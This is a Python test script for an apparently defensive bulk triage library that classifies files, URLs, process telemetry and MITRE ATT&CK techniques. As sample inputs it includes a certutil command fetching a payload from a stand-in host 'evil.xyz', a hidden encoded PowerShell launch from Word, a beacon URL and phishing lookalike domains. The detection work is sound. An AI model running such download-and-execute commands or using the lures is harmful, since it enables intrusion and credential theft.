from pathlib import Path
from bulk_triage import triage_files_bulk, triage_urls_bulk, triage_processes_bulk, tag_mitre_techniques_bulk

def main():
    print("=== TEST 1: BULK FILE TRIAGE (Jev System One via classifier.dev) ===")
    files = list(Path("samples").glob("*"))
    print(f"Submitting {len(files)} files in 1 HTTP call...")
    f_res = triage_files_bulk(files)
    for r in f_res:
        print(f"  [{r['verdict'].upper()}] conf={r['confidence']:.2f} deep_scan={r['needs_deep_scan']} -> {r['name']}")

    print("\n=== TEST 2: BULK URL & PHISHING TRIAGE ===")
    urls = [
        "https://www.google.com/search?q=cybersecurity",
        "https://github.com/microsoft/vscode",
        "http://185.220.101.5/beacon.exe",
        "https://appleid-security-update.click/login",
        "https://paypal-account-verification-portal.xyz/signin",
        "http://legit-news.com/redirect.php?url=http://malware-site.top"
    ]
    print(f"Submitting {len(urls)} URLs in 1 HTTP call...")
    u_res = triage_urls_bulk(urls)
    for r in u_res:
        print(f"  [{r['action']} / {r['verdict']}] conf={r['confidence']:.2f} -> {r['url']}")

    print("\n=== TEST 3: LIVE EDR PROCESS TELEMETRY AUDIT ===")
    procs = [
        {"pid": 1004, "name": "explorer.exe", "parent_name": "userinit.exe", "cmdline": "C:\\Windows\\explorer.exe", "network_connections": []},
        {"pid": 4512, "name": "chrome.exe", "parent_name": "explorer.exe", "cmdline": "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "network_connections": [{"remote_ip": "142.250.190.46"}]},
        {"pid": 9824, "name": "powershell.exe", "parent_name": "winword.exe", "cmdline": "powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA...", "network_connections": [{"remote_ip": "45.33.32.156"}]},
        {"pid": 6712, "name": "certutil.exe", "parent_name": "cmd.exe", "cmdline": "certutil.exe -urlcache -split -f http://evil.xyz/payload.exe payload.exe", "network_connections": [{"remote_ip": "194.26.29.112"}]}
    ]
    print(f"Submitting {len(procs)} process execution descriptors in 1 HTTP call...")
    p_res = triage_processes_bulk(procs)
    for r in p_res:
        print(f"  [{r['action']} / {r['verdict']}] conf={r['confidence']:.2f} -> PID {r['pid']} ({r['name']}) parent={r['parent_name']}")

    print("\n=== TEST 4: MULTI-LABEL MITRE ATT&CK TAGGING ===")
    threats = [
        "winword.exe spawned hidden powershell downloading remote base64 payload from an external IP",
        "certutil used to fetch executable payload into AppData and created registry Run key"
    ]
    m_res = tag_mitre_techniques_bulk(threats)
    for t, res in zip(threats, m_res):
        print(f"  Threat: '{t}'")
        print(f"    Labels: {res.get('labels')}")
        print(f"    Top scores: {list(res.get('scores', {}).items())[:3]}")

if __name__ == "__main__":
    main()
